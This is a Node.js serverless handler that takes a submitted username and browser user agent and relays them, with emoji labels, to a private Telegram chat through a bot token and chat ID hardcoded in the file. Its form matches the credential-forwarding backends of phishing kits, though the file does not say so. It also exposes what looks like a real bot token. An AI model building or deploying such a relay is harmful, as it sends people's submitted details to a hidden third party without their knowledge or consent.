module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const token = '7980617142:AAFzl-zy6O9W1cOIauK9ksDI8Zm7beQ3AsE';
  const chatId = '-5263210542';

  try {
    const { username, agent } = req.body;

    const message = `
📩  a24

📧 username: ${username}
🖥️ Agent: ${agent}
    `;

    const tgRes = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }
    );

    const data = await tgRes.json();

    return res.status(200).json({
      ok: true,
      telegram: data
    });

  } catch (err) {
    return res.status(500).json({
      error: 'Server error',
      details: err.message
    });
  }
};